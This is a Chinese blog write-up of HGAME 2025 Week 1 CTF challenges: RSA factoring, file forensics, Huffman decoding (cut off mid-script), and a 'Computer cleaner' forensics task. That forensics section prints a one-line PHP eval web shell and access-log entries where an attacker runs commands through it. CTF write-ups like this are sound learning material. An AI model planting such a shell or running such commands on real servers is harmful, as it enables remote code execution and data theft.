<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/fontawesome/css/brands.css" rel="stylesheet">
<link href="/fontawesome/css/solid.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  

  
  <title>HGAME 2025 WriteUp | 棱晶の小窝</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="一转眼已经到2025年了，其实2024年年末还参加了一些比赛（比如长城杯，DASCTF什么的），但是打的都不太好，怕丢人就不发wp了（）2025，新年新的开始，望自己在新的一年能多AK少爆零（） 赛题轮次：Week 1Crypto方向：suprimeRSA：这题貌似有两个版本，我是在第一个版本做的，看了一会没什么思路，再看公钥n只有六十多位，于是用了个耍赖的方法：（或许是因为纯按数学方法做这个题很">
<meta property="og:type" content="article">
<meta property="og:title" content="HGAME 2025 WriteUp">
<meta property="og:url" content="https://astralprisma.github.io/2025/02/17/hgame_25/index.html">
<meta property="og:site_name" content="棱晶の小窝">
<meta property="og:description" content="一转眼已经到2025年了，其实2024年年末还参加了一些比赛（比如长城杯，DASCTF什么的），但是打的都不太好，怕丢人就不发wp了（）2025，新年新的开始，望自己在新的一年能多AK少爆零（） 赛题轮次：Week 1Crypto方向：suprimeRSA：这题貌似有两个版本，我是在第一个版本做的，看了一会没什么思路，再看公钥n只有六十多位，于是用了个耍赖的方法：（或许是因为纯按数学方法做这个题很">
<meta property="og:locale">
<meta property="og:image" content="https://astralprisma.github.io/source/pictures/hgame25_delta.png">
<meta property="article:published_time" content="2025-02-16T16:00:00.000Z">
<meta property="article:modified_time" content="2025-03-18T16:53:37.527Z">
<meta property="article:author" content="Astral Prisma">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://astralprisma.github.io/source/pictures/hgame25_delta.png">
  
  
    <link rel="shortcut icon" href="/XH.png">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/OTSA.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>棱晶の小窝 </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/AP.png></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Astral Prisma </div>
      <div class="dot"></div>
      <div class="subtitle">星界棱晶 </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/454936579" title="Bilibili"><image src=https://www.bilibili.com/favicon.ico></image></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://www.primegrid.com/show_user.php?userid=1243718" title="PrimeGrid"><image src=https://www.primegrid.com/images/favicon_32.png></image></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/AstralPrisma" title="GitHub"><image src=https://github.githubassets.com/favicons/favicon.png></image></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/WriteUp/">
                WriteUp
                <div class="category-count">5</div>
            </a>
        </div>
    </div>
  </div>


    
      

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-hgame_25" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        HGAME 2025 WriteUp
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2025-02-16T16:00:00.000Z" itemprop="datePublished">2025-02-17</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/WriteUp/">WriteUp</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            12k words 
          </div>
        </div>
        
      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <p>一转眼已经到2025年了，其实2024年年末还参加了一些比赛（比如长城杯，DASCTF什么的），但是打的都不太好，怕丢人就不发wp了（）<br><br>2025，新年新的开始，望自己在新的一年能多AK少爆零（）</p>
<h1 id="赛题轮次：Week-1"><a href="#赛题轮次：Week-1" class="headerlink" title="赛题轮次：Week 1"></a>赛题轮次：Week 1</h1><h2 id="Crypto方向："><a href="#Crypto方向：" class="headerlink" title="Crypto方向："></a>Crypto方向：</h2><h3 id="suprimeRSA："><a href="#suprimeRSA：" class="headerlink" title="suprimeRSA："></a>suprimeRSA：</h3><p>这题貌似有两个版本，我是在第一个版本做的，看了一会没什么思路，再看公钥n只有六十多位，于是用了个<del>耍赖</del>的方法：<del>（或许是因为纯按数学方法做这个题很困难，暴力破解反而拿下了一血）</del><br><br>yafu暴力分解n得到p和q：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P48 = <span class="number">796688410951167236263039235508020180383351898113</span></span><br><span class="line">P48 = <span class="number">839777194079410698093279448382785381699926556673</span></span><br></pre></td></tr></table></figure>
<p>解密得到flag：<font color=deepskyblue><strong>hgame{ROCA_ROCK_and_ROll!}</strong></font>.</p>
<h2 id="Misc方向："><a href="#Misc方向：" class="headerlink" title="Misc方向："></a>Misc方向：</h2><h3 id="Hakuya-Want-A-Girl-Friend："><a href="#Hakuya-Want-A-Girl-Friend：" class="headerlink" title="Hakuya Want A Girl Friend："></a>Hakuya Want A Girl Friend：</h3><p>打开txt发现是每个字节的ASCII，010editor转成文件后发现了一个zip文件和一个所有字节全都倒过来的png文件，png文件的宽高不正确，修改宽高后得到zip文件的密码<font color=red><strong>To_f1nd_th3_QQ</strong></font>，解压后得到flag：<font color=deepskyblue><strong>hagme{h4kyu4_w4nt_gir1f3nd_+q_931290928}</strong></font><del>（前面的hgame反了）</del>.</p>
<h3 id="Computer-cleaner："><a href="#Computer-cleaner：" class="headerlink" title="Computer cleaner："></a>Computer cleaner：</h3><p>打开虚拟机后搜索&#x2F;var&#x2F;www&#x2F;html路径下的.php文件，找到两个：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vidar@vidar-computer:~$ find /var/www/html -name <span class="string">&quot;*.php&quot;</span></span><br><span class="line">/var/www/html/upload.php</span><br><span class="line">/var/www/html/uploads/shell.php</span><br></pre></td></tr></table></figure>
<p>查询grep指令得到flag的第1部分：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vidar@vidar-computer:~$ grep -r <span class="string">&quot;eval(&quot;</span> /var/www/html</span><br><span class="line">/var/www/html/uploads/shell.php:&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hgame&#123;y0u_&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>
<p>在浏览文件时在<code>documents</code>文件夹中找到了<code>flag_part3</code>文件，为flag的最后一部分：<code>_c0mput3r!&#125;</code></p>
<p>查看两个php：</p>
<p>upload.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 日志文件路径</span></span><br><span class="line"><span class="variable">$log_file</span> = <span class="string">&#x27;upload_log.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查文件是否上传</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">    <span class="comment">// 获取文件信息</span></span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义上传目录</span></span><br><span class="line">    <span class="variable">$upload_dir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$upload_dir</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload_dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将文件移动到目标目录</span></span><br><span class="line">    <span class="variable">$target_file</span> = <span class="variable">$upload_dir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$file_name</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file_tmp</span>, <span class="variable">$target_file</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件上传成功！&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录日志</span></span><br><span class="line">        <span class="variable">$log_message</span> = <span class="string">&quot;[&quot;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>) . <span class="string">&quot;] 上传成功：<span class="subst">$file_name</span>, 大小：<span class="subst">$file_size</span> 字节\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$log_file</span>, <span class="variable">$log_message</span>, FILE_APPEND);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件上传失败！&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传过程中发生错误。&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">// 记录日志</span></span><br><span class="line">    <span class="variable">$log_message</span> = <span class="string">&quot;[&quot;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>) . <span class="string">&quot;] 上传失败：错误代码 &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$log_file</span>, <span class="variable">$log_message</span>, FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>shell.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($\_POST[<span class="string">&#x27;hgame&#123;y0u\_&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>查看<code>/var/www/html</code>路径下的所有文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vidar@vidar-computer:~$ <span class="built_in">ls</span> /var/www/html/</span><br><span class="line">index.html  upload.html  upload\_log.txt  upload.php  uploads</span><br><span class="line">vidar@vidar-computer:~$ <span class="built_in">ls</span> /var/www/html/uploads</span><br><span class="line">shell.php</span><br></pre></td></tr></table></figure>
<p>查看这些文件的内容：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vidar@vidar-computer:~$ <span class="built_in">cat</span> /var/www/html/index.html</span><br><span class="line">Don<span class="string">&#x27;t hack me!!!!!!!!!</span></span><br><span class="line"><span class="string">vidar@vidar-computer:~$ cat /var/www/html/upload.html</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>选择文件：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vidar@vidar-computer:~$ <span class="built_in">cat</span> /var/www/html/upload\_log.txt（这里也能看出来flag的第三部分的上传记录）</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">121.41.34.25 - - [17/Jan/2025:12:01:03 +0000] &quot;GET / HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36&quot;</span><br><span class="line">121.41.34.25 - - [17/Jan/2025:12:01:03 +0000] &quot;GET /upload HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36&quot;</span><br><span class="line">121.41.34.25 - - [17/Jan/2025:12:01:15 +0000] &quot;POST /upload HTTP/1.1&quot; 200 512 &quot;http://localhost/upload&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36&quot;</span><br><span class="line">121.41.34.25 - - [17/Jan/2025:12:01:20 +0000] &quot;POST /upload HTTP/1.1&quot; 200 1024 &quot;http://localhost/upload&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36&quot;</span><br><span class="line">121.41.34.25 - - [17/Jan/2025:12:01:35 +0000] &quot;POST /upload HTTP/1.1&quot; 200 1024 &quot;http://localhost/upload&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36&quot;</span><br><span class="line">121.41.34.25 - - [17/Jan/2025:12:01:50 +0000] &quot;POST /upload HTTP/1.1&quot; 200 1030 &quot;http://localhost/upload&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36&quot;</span><br><span class="line">121.41.34.25 - - [17/Jan/2025:12:01:55 +0000] &quot;GET /uploads/shell.php HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36&quot;</span><br><span class="line">121.41.34.25 - - [17/Jan/2025:12:02:00 +0000] &quot;GET /uploads/shell.php?cmd=ls HTTP/1.1&quot; 200 2048 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36&quot;</span><br><span class="line">121.41.34.25 - - [17/Jan/2025:12:02:05 +0000] &quot;GET /uploads/shell.php?cmd=cat%20~/Documents/flag_part3 HTTP/1.1&quot; 200 2048 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36&quot;</span><br></pre></td></tr></table></figure>
<p>访问<code>121.41.34.25</code>，得到flag的第二部分：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Are you looking for me</span><br><span class="line">Congratulations!!!</span><br><span class="line">hav3_cleaned_th3</span><br></pre></td></tr></table></figure>
<p>拼合得到flag：<font color=deepskyblue><strong>hgame{y0u_hav3_cleaned_th3_c0mput3r!}</strong></font>.</p>
<h2 id="Reverse方向："><a href="#Reverse方向：" class="headerlink" title="Reverse方向："></a>Reverse方向：</h2><h3 id="Compress-dot-new："><a href="#Compress-dot-new：" class="headerlink" title="Compress dot new："></a>Compress dot new：</h3><p>脚本中compress函数首先通过bf函数计算字符频率，然后使用h函数生成霍夫曼树，接着用gc函数对霍夫曼树进行编码，最后用enc函数将输入的二进制数据按照霍夫曼编码表转换为字符串输出，编写python脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># 解析霍夫曼树</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_tree</span>(<span class="params">node, path=<span class="string">&#x27;&#x27;</span>, dict_path=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> dict_path <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        dict_path = &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> node:  <span class="comment"># Leaf node</span></span><br><span class="line">        dict_path[path] = <span class="built_in">chr</span>(node[<span class="string">&#x27;s&#x27;</span>])</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Internal node</span></span><br><span class="line">        parse_tree(node[<span class="string">&#x27;a&#x27;</span>], path + <span class="string">&#x27;0&#x27;</span>, dict_path)</span><br><span class="line">        parse_tree(node[<span class="string">&#x27;b&#x27;</span>], path + <span class="string">&#x27;1&#x27;</span>, dict_path)</span><br><span class="line">    <span class="keyword">return</span> dict_path</span><br><span class="line"><span class="comment"># 使用霍夫曼树解码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_huffman</span>(<span class="params">encoded_str, huffman_tree_dict</span>):</span><br><span class="line">    output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    current_code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> encoded_str:</span><br><span class="line">        current_code += bit</span><br><span class="line">        <span class="keyword">if</span> current_code <span class="keyword">in</span> huffman_tree_dict:</span><br><span class="line">            output += huffman_tree_dict[current_code]</span><br><span class="line">            current_code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    json_data = <span 